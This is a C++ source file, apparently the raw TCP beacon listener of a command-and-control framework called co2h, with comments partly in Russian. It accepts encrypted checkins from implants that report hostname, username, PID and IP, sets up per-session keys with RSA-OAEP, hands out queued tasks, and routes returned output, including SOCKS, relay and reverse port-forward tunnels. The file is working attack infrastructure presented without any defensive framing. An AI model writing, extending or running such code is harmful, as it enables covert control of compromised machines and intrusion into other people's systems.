// Raw TCP listener for beacons. Envelope: [u32 BE len][u8 type][payload].
// Логика идентична HttpsListener'у, без HTTP-обёртки.

#include "TcpListener.hpp"
#include "../https/BeaconCrypto.hpp"
#include "../https/RsaOaep.hpp"
#include "../../Core.hpp"
#include "../../core/SessionRegistry.hpp"
#include "../../core/TaskQueue.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

#include <array>
#include <chrono>
#include <memory>

namespace co2h::server::tcp_raw {

using namespace ::co2h::kv;
namespace https = ::co2h::server::https;

namespace {

std::string random_hex_id() {
    std::array<std::uint8_t, 8> raw{};
    co2h::crypto::random_bytes(raw.data(), raw.size());
    return co2h::hex_encode({raw.data(), raw.size()});
}

class TcpConn : public std::enable_shared_from_this<TcpConn> {
public:
    TcpConn(std::shared_ptr<TcpListener> l, asio::ip::tcp::socket s)
        : listener_(std::move(l)), sock_(std::move(s)) {}

    void start() { read_header(); }

private:
    void read_header() {
        auto self = shared_from_this();
        asio::async_read(sock_, asio::buffer(hdr_, 5),
            [this, self](const std::error_code& ec, std::size_t) {
                if (ec) return;
                std::uint32_t total =
                    (std::uint32_t(hdr_[0]) << 24) | (std::uint32_t(hdr_[1]) << 16) |
                    (std::uint32_t(hdr_[2]) <<  8) |  std::uint32_t(hdr_[3]);
                if (total < 1 || total > proto::tport::kMaxLen) return;
                msg_type_ = hdr_[4];
                std::size_t body = total - 1;
                body_.assign(body, 0);
                if (body == 0) { handle(); return; }
                asio::async_read(sock_, asio::buffer(body_),
                    [this, self](const std::error_code& ec2, std::size_t) {
                        if (ec2) return;
                        handle();
                    });
            });
    }

    void handle() {
        switch (msg_type_) {
            case proto::tport::kCheckin: handle_checkin(); break;
            case proto::tport::kPoll:    handle_poll();    break;
            case proto::tport::kOutput:  handle_output();  break;
            default: return;  // close on unknown
        }
    }

    void handle_checkin() {
        auto pt = https::open_frame(listener_->listener_key(),
                                    {body_.data(), body_.size()});
        if (!pt) {
            spdlog::warn("tcp checkin: decrypt failed (body={}b)", body_.size());
            return;
        }
        Reader r{{pt->data(), pt->size()}};
        BeaconSession s;
        s.id          = random_hex_id();
        s.listener    = listener_->name();
        s.hostname    = std::string{r.get_str("host").value_or("")};
        s.username    = std::string{r.get_str("user").value_or("")};
        s.pid         = r.get_u32("pid").value_or(0);
        s.arch        = std::string{r.get_str("arch").value_or("x64")};
        s.os          = std::string{r.get_str("os").value_or("windows")};
        s.internal_ip = std::string{r.get_str("ip").value_or("")};
        s.parent_id   = std::string{r.get_str("parent_id").value_or("")};
        std::error_code ec;
        auto ep = sock_.remote_endpoint(ec);
        if (!ec) {
            const auto addr = ep.address().to_string();
            s.external_ip = addr;
            if (s.internal_ip.empty()) s.internal_ip = addr;
        }
        s.first_seen = s.last_seen = std::chrono::system_clock::now();

        // RSA-OAEP-wrapped per-session key. Те же правила, что и в HTTPS:
        // beacon с baked-in pubkey шлёт wrapped_key, иначе fallback на listener_key.
        s.session_key = listener_->listener_key();
        auto wrapped = r.get_bytes("wrapped_key");
        if (wrapped && !listener_->rsa_priv_blob().empty()) {
            auto dec = https::rsa_oaep_decrypt(listener_->rsa_priv_blob(),
                                               {wrapped->data(), wrapped->size()});
            if (dec && dec->size() == s.session_key.size()) {
                std::copy(dec->begin(), dec->end(), s.session_key.begin());
            } else {
                spdlog::warn("tcp checkin: wrapped_key decrypt failed "
                             "(size={}); using listener_key fallback",
                             wrapped->size());
            }
        }

        listener_->core()->sessions().create_or_update(s);
        beacon_id_ = s.id;
        spdlog::info("tcp beacon checkin id={} host={} user={} listener={}",
                     s.id, s.hostname, s.username, s.listener);

        Writer w;
        w.put_str("beacon_id", s.id);
        auto enc = https::seal_frame(listener_->listener_key(), w.finish());
        send_env(proto::tport::kCheckin, enc);
    }

    void handle_poll() {
        auto sess = listener_->core()->sessions().get(beacon_id_);
        if (!sess) return;
        sess->last_seen = std::chrono::system_clock::now();
        auto drained = listener_->core()->tasks().drain(beacon_id_);

        Writer w;
        w.put_u32("count", static_cast<std::uint32_t>(drained.size()));
        for (std::size_t i = 0; i < drained.size(); ++i) {
            auto idx = std::to_string(i);
            w.put_u64("id_"      + idx, drained[i].id);
            w.put_u32("op_"      + idx, static_cast<std::uint32_t>(drained[i].op));
            w.put_bytes("payload_" + idx,
                        {drained[i].payload.data(), drained[i].payload.size()});
        }
        auto enc = https::seal_frame(sess->session_key, w.finish());
        send_env(proto::tport::kTasks, enc);
    }

    void handle_output() {
        auto sess = listener_->core()->sessions().get(beacon_id_);
        if (!sess) return;
        sess->last_seen = std::chrono::system_clock::now();
        auto pt = https::open_frame(sess->session_key,
                                    {body_.data(), body_.size()});
        if (pt) {
            Reader r{{pt->data(), pt->size()}};

            // Получаем task_id как строку и числом.
            // Строковое сравнение используется как fallback: некоторые версии
            // MSVC некорректно обрабатывают from_chars для значений близких к
            // UINT64_MAX, возвращая nullopt вместо корректного числа.
            auto task_id_sv = r.get_str("task_id").value_or(std::string_view{});
            auto task_id    = r.get_u64("task_id").value_or(0);

            auto out     = r.get_bytes("output").value_or(BytesView{});
            auto err     = r.get_str("error").value_or("");
            auto is_last = r.get_u32("is_last").value_or(1);
            auto resp    = r.get_u32("resp").value_or(2);

            // Магические task_id — SOCKS/relay/rportfwd, маршрутизируются отдельно.
            // Сравниваем и числом, и строкой — на случай проблем с from_chars.
            static constexpr std::uint64_t   kSocksMagic     = 0xFFFFFFFFFFFFFFFEULL;
            static constexpr std::uint64_t   kRelayMagic     = 0xFFFFFFFFFFFFFFFDULL;
            static constexpr std::uint64_t   kRportfwdMagic  = 0xFFFFFFFFFFFFFFFCULL;
            static constexpr std::string_view kSocksMagicStr  = "18446744073709551614";
            static constexpr std::string_view kRelayMagicStr  = "18446744073709551613";
            static constexpr std::string_view kRportfwdMagicStr = "18446744073709551612";

            bool is_socks   = (task_id == kSocksMagic)   || (task_id_sv == kSocksMagicStr);
            bool is_relay   = (task_id == kRelayMagic)   || (task_id_sv == kRelayMagicStr);
            bool is_rportfwd = (task_id == kRportfwdMagic) || (task_id_sv == kRportfwdMagicStr);

            if (is_socks) {
                if (!out.empty())
                    listener_->core()->route_socks_output(sess->id, out);
            } else if (is_relay) {
                if (!out.empty())
                    listener_->core()->route_relay_output(sess->id, out);
            } else if (is_rportfwd) {
                if (!out.empty())
                    listener_->core()->route_rportfwd_output(sess->id, out);
            } else {
                if (!out.empty()) {
                    spdlog::debug("tcp output: beacon={} task_id={} out={}b",
                                  sess->id, task_id_sv, out.size());
                }
                Writer w;
                w.put_str("beacon_id", sess->id);
                w.put_u64("task_id", task_id);
                w.put_u32("is_last", is_last);
                w.put_u32("resp",    resp);
                if (!err.empty()) w.put_str("error", std::string{err});
                if (!out.empty()) w.put_bytes("output", out);
                listener_->core()->broadcast_event(proto::EventCategory::Tasks, w.finish());
            }
        }
        send_env(proto::tport::kAck, Bytes{});
    }

    void send_env(std::uint8_t type, const Bytes& payload) {
        std::uint32_t total = static_cast<std::uint32_t>(1 + payload.size());
        auto buf = std::make_shared<Bytes>();
        buf->reserve(5 + payload.size());
        buf->push_back(static_cast<std::uint8_t>(total >> 24));
        buf->push_back(static_cast<std::uint8_t>(total >> 16));
        buf->push_back(static_cast<std::uint8_t>(total >>  8));
        buf->push_back(static_cast<std::uint8_t>(total));
        buf->push_back(type);
        buf->insert(buf->end(), payload.begin(), payload.end());
        auto self = shared_from_this();
        asio::async_write(sock_, asio::buffer(*buf),
            [this, self, buf](const std::error_code& ec, std::size_t) {
                if (ec) return;
                read_header();
            });
    }

    std::shared_ptr<TcpListener> listener_;
    asio::ip::tcp::socket        sock_;
    std::uint8_t                 hdr_[5]{};
    std::uint8_t                 msg_type_{};
    Bytes                        body_;
    std::string                  beacon_id_;
};

} // namespace

TcpListener::TcpListener(std::shared_ptr<Core> core, TcpConfig cfg)
    : core_(std::move(core)), cfg_(std::move(cfg)), acc_(core_->io()) {}

void TcpListener::start() {
    asio::ip::tcp::endpoint ep{
        asio::ip::make_address(cfg_.bind_host), cfg_.bind_port};
    acc_.open(ep.protocol());
    acc_.set_option(asio::ip::tcp::acceptor::reuse_address(true));
    acc_.bind(ep);
    acc_.listen();
    spdlog::info("tcp listener '{}' on {}", cfg_.name, bind_addr());
    do_accept();
}

void TcpListener::stop() {
    std::error_code ec;
    acc_.close(ec);
}

void TcpListener::do_accept() {
    auto self = shared_from_this();
    auto sock = std::make_shared<asio::ip::tcp::socket>(core_->io());
    acc_.async_accept(*sock, [this, self, sock](const std::error_code& ec) {
        if (ec) {
            if (ec != asio::error::operation_aborted)
                spdlog::warn("tcp '{}' accept: {}", cfg_.name, ec.message());
            return;
        }
        auto conn = std::make_shared<TcpConn>(self, std::move(*sock));
        conn->start();
        do_accept();
    });
}

}
